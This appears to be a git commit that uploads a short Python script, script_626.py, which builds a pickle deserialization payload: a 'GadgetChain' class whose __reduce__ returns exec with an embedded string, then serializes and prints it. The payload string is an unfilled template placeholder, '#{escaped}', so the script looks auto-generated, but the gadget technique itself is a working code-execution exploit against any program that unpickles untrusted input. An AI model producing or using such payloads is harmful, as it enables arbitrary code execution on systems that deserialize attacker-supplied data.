f83906d6f14997ec06c96417363e556f1ca7303f
developersl-vihaga <githubdevelopersl@gmail.com>
2025-05-07 01:49:54 +0530

    Upload script_626.py

---
+++ script_626.py
@@ -0,0 +1,7 @@
+import pickle
+class GadgetChain:
+    def __reduce__(self):
+        return __builtins__.exec, ('#{escaped}',)
+if __name__ == '__main__':
+    pickled = pickle.dumps(GadgetChain(), protocol=0)
+    print(repr(pickled.decode()))
